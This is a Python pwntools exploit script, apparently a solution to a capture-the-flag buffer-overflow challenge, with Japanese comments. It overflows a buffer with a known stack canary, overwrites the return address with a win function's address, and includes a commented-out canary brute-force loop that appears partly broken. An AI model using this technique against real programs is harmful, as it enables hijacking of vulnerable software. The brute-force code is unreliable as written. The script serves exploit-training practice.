# coding: utf-8
from pwn import *
import time

# Canaryを1バイトずつBruteForceで特定する
# 0x00から0x255までの値でcanaryをbofで上書きしていき、***Stack Smashing...***がでなければ1バイト特定できたことになる

BUF_SIZE = 32 
CANARY_SIZE = 4

padding_size = 16
win_addr = 0x80486eb
canary = 'IHwj' # 下のコードで特定したcanary

p = process('./vuln')

payload = 'A' * BUF_SIZE
payload += canary
payload += 'A' * padding_size
payload += p32(win_addr)

p.recvuntil('> ')
p.sendline('300')
p.recvuntil('Input> ')
p.sendline(payload)

p.interactive()

# -----------------------------------
# Canary Brute Force Code
# -----------------------------------
# brute_force_count = 0
# for c in range(1):
#     for i in range(255):
#         print("Current: %s" % chr(i))
#         time.sleep(0.1)
#         p = process('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
# 
#         payload = 'A' * BUF_SIZE
#         # if canary != '':
#         #     payload += canary
#         payload += canary
#         payload += 'A' * padding_size
#         payload += p32(win_addr)
#         # payload += chr(i)
#         length = BUF_SIZE + len(canary) + 1
#         print(length)
# 
#         p.recvuntil('> ')
#         p.sendline(str(length))
#         p.recvuntil('Input> ')
#         p.sendline(payload)
# 
#         r = p.recv(1048)
#         if "***" in r:
#             continue
#         else:
#             canary += chr(i)
#             print("!!! Detected. Canary: %s" % canary)
#             break
# 
# print(canary)
# coding: utf-8
# -----------------------------------
